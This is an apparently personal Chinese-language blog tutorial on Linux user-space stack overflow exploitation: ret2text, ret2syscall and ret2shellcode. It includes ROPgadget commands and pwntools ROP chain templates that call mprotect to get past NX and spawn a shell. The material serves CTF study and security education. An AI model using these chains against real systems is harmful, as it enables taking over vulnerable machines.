<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/linux 栈溢出/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            linux 栈溢出 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux 栈溢出</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 03:10:56</span>
        <span class="mobile">2024-11-08 03:10:56</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-12-03 00:21:29</span>
            <span class="mobile">2025-12-03 00:21:29</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-user/">linux user</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-user-pwn/">linux user pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>24.1k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>113 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。</p>
<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>栈溢出覆盖返回地址为后门函数从而获取shell。</p>
<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="系统调用约定"><a href="#系统调用约定" class="headerlink" title="系统调用约定"></a>系统调用约定</h2><table>
<thead>
<tr>
<th>含义</th>
<th>amd64 (syscall)</th>
<th>i386 (int 0x80)</th>
</tr>
</thead>
<tbody><tr>
<td>号</td>
<td><code>RAX</code></td>
<td><code>EAX</code></td>
</tr>
<tr>
<td>arg1</td>
<td><code>RDI</code></td>
<td><code>EBX</code></td>
</tr>
<tr>
<td>arg2</td>
<td><code>RSI</code></td>
<td><code>ECX</code></td>
</tr>
<tr>
<td>arg3</td>
<td><code>RDX</code></td>
<td><code>EDX</code></td>
</tr>
<tr>
<td>arg4</td>
<td><code>R10</code> ⭐</td>
<td><code>ESI</code></td>
</tr>
<tr>
<td>arg5</td>
<td><code>R8</code></td>
<td><code>EDI</code></td>
</tr>
<tr>
<td>arg6</td>
<td><code>R9</code></td>
<td><code>EBP</code></td>
</tr>
<tr>
<td>指令</td>
<td><code>syscall</code></td>
<td><code>int 0x80</code>（或 <code>__kernel_vsyscall</code>&#x2F;<code>sysenter</code> 由 vDSO 处理）</td>
</tr>
<tr>
<td>返回</td>
<td><code>RAX</code></td>
<td><code>EAX</code></td>
</tr>
<tr>
<td>错误</td>
<td><code>RAX</code> ∈ [-4095,-1]（即 <code>-errno</code>）</td>
<td><code>EAX</code> ∈ [-4095,-1]（<code>-errno</code>）</td>
</tr>
<tr>
<td>典型被破坏</td>
<td><code>RCX</code>,<code>R11</code>（一定会被 clobber）</td>
<td><code>EAX</code>（返回值），EFLAGS</td>
</tr>
</tbody></table>
<blockquote>
<p>⭐ 为啥 arg4 用 <code>R10</code> 而不是 <code>RCX</code>？<br>因为 <code>syscall</code> 指令会把 <code>RCX</code>&#x2F;<code>R11</code> 用作内部用途（保存返回地址和标志），返回后视为<strong>已破坏</strong>，所以内核 ABI 规定第 4 个参数改用 <code>R10</code>。</p>
</blockquote>
<h2 id="搜索-gadget"><a href="#搜索-gadget" class="headerlink" title="搜索 gadget"></a>搜索 gadget</h2><p>构造rop链模拟系统调用过程</p>
<p><code>ROPgadget</code>有时可自动构造，但可能长度过长，建议手动构造。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget.py --binary ./pwn --ropchain</span><br></pre></td></tr></table></figure></div>

<p><code>ROPgadget</code>检索相关指令举例：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure></div>

<p><code>ropper</code> 检索 gadget 举例：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div>

<p>注意：</p>
<ul>
<li>rax&#x2F;eax 寄存器通常用来存储返回值，因此可以通过控制返回值来控制 rax&#x2F;eax 寄存器，不一定需要 gadget。例如 alarm 函数每次会返回上一次设置的 alarm 的剩余时间，特别的，第一次会返回 0。因此可以通过栈溢出反复调用 alarm 并控制交互时间来控制 eax 寄存器的值。</li>
<li>可以通过 ret2csu 来控制寄存器。</li>
<li>如果寄存器不好控制可以考虑 SROP 。</li>
<li>如果缺少 <code>syscall; ret;</code> 可以考虑将题目中的 <code>alarm@got</code> 中的内容通过 rop（例如 <code>add byte ptr [rdi], al; ret;</code>）加一个偏移，这样 <code>alarm@plt</code> 就可以当做 <code>syscall; ret;</code> 使用。</li>
</ul>
<h2 id="常用-rop-链"><a href="#常用-rop-链" class="headerlink" title="常用 rop 链"></a>常用 rop 链</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><ul>
<li>eax &#x3D; 0x0b</li>
<li>ebx指向<code>&quot;/bin/sh&quot;</code></li>
<li>ecx &#x3D; 0x0</li>
<li>edx &#x3D; 0x0</li>
</ul>
<p>rop示例：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/0386c58178b9c5d125f63daaba1d0ab2.png"
                      alt="图片"
                ></p>
<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><ul>
<li>rax &#x3D; 0x3b</li>
<li>rdi指向<code>&quot;/bin/sh&quot;</code></li>
<li>rsi &#x3D; 0x0</li>
<li>rdx &#x3D; 0x0</li>
</ul>
<p>rop示例：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/513d283d1e58ea87558b0a1c7be5f06a.png"
                      alt="图片"
                ></p>
<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>将 shellcode 写入可执行的内存地址处，然后栈溢出覆盖返回地址到 shellcode 从而执行 shellcode 获取shell。</p>
<h2 id="NX-绕过"><a href="#NX-绕过" class="headerlink" title="NX 绕过"></a>NX 绕过</h2><p><code>mprotect</code> 系统调用可以修改一段<strong>已经映射</strong>内存区域的访问权限（R&#x2F;W&#x2F;X）。该系统调用的系统调用号在 64 位下是 10；32 位下是 125。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数：</strong><ul>
<li><code>addr</code>：起始地址，<strong>必须按页对齐</strong>（通常 4096B）。</li>
<li><code>len</code>：长度，内核会<strong>向上取整到页大小</strong>并作用于整页。</li>
<li><code>prot</code>：权限位的组合：<code>PROT_NONE|PROT_READ|PROT_WRITE|PROT_EXEC</code>。</li>
</ul>
</li>
<li><strong>返回值：</strong><ul>
<li><code>0</code> 成功；</li>
<li><code>-1</code> 失败并置 <code>errno</code>。</li>
</ul>
</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><code>EINVAL</code>：<code>addr</code> 未页对齐，<code>len==0</code>，或 <code>prot</code> 非法&#x2F;含未知位。</li>
<li><code>ENOMEM</code>：区域内包含未映射页（或地址越界）。</li>
<li><code>EACCES/EPERM</code>：出于安全策略或底层限制拒绝（例如 W^X、某些映射不允许变更可执行位等）。</li>
</ul>

    </div>
  </div>

<h3 id="32-位"><a href="#32-位" class="headerlink" title="32 位"></a>32 位</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p32(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">rop += p32(shellcode_addr)</span><br><span class="line">rop += p32(shellcode_addr &amp; ~<span class="number">0xFFF</span>)</span><br><span class="line">rop += p32(<span class="number">0x2000</span>)</span><br><span class="line">rop += p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p32(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop eax; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p32(<span class="number">125</span>)</span><br><span class="line">rop += p32(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop ecx; pop edx; ret&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p32(<span class="number">0x2000</span>)</span><br><span class="line">rop += p32(<span class="number">7</span>)</span><br><span class="line">rop += p32(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop ebx; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p32(shellcode_addr &amp; ~<span class="number">0xFFF</span>)</span><br><span class="line">rop += p32(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p32(shellcode_addr)</span><br></pre></td></tr></table></figure></div>

<h3 id="64-位"><a href="#64-位" class="headerlink" title="64 位"></a>64 位</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(shellcode_addr &amp; ~<span class="number">0xFFF</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x2000</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">7</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">rop += p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(shellcode_addr &amp; ~<span class="number">0xFFF</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">0x2000</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">7</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(<span class="number">10</span>)</span><br><span class="line">rop += p64(<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret;&#x27;</span>), executable=<span class="literal">True</span>)))</span><br><span class="line">rop += p64(shellcode_addr)</span><br></pre></td></tr></table></figure></div>

<h2 id="shellcode-调试"><a href="#shellcode-调试" class="headerlink" title="shellcode 调试"></a>shellcode 调试</h2><p><strong><code>pwnlib.gdb.debug_shellcode</code></strong> 把你给的 <strong>shellcode 机器码（bytes）</strong> 打包成一个最小 ELF，直接用 <strong>GDB 启动并附加调试</strong>。省去了手写 stub、链接、再起 GDB 的繁琐步骤。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug_shellcode(data, gdbscript=<span class="literal">None</span>, vma=<span class="literal">None</span>, api=<span class="literal">False</span>, **kwargs) -&gt; process</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>参数：</strong><ul>
<li><p><code>data</code>：<strong>bytes</strong>。你的 shellcode 机器码。</p>
</li>
<li><p><code>gdbscript</code>：给 GDB 的脚本字符串。</p>
</li>
<li><p><code>vma</code>：把 ELF <strong>映射到的基址</strong>（虚拟内存地址）。</p>
<ul>
<li>64 位常见：<code>0x400000</code>；32 位常见：<code>0x08048000</code>。</li>
<li>需要<strong>页对齐</strong>（通常 0x1000 对齐）。</li>
<li>如果内核&#x2F;装载器不允许该地址，可能回退或失败。</li>
</ul>
</li>
<li><p><code>api</code>：是否启用 <strong>GDB Python API</strong>（一般默认就能用；保持 False 即可）。</p>
</li>
<li><p><code>**kwargs</code>：覆盖 <code>pwnlib.context</code> 的配置。最常用的是 **<code>arch</code> 与 <code>os</code>**，例如：</p>
<ul>
<li><code>arch=&#39;amd64&#39;</code> &#x2F; <code>arch=&#39;i386&#39;</code>（32 位）</li>
<li><code>os=&#39;linux&#39;</code>（默认就是 linux）</li>
</ul>
</li>
</ul>
</li>
</ul>
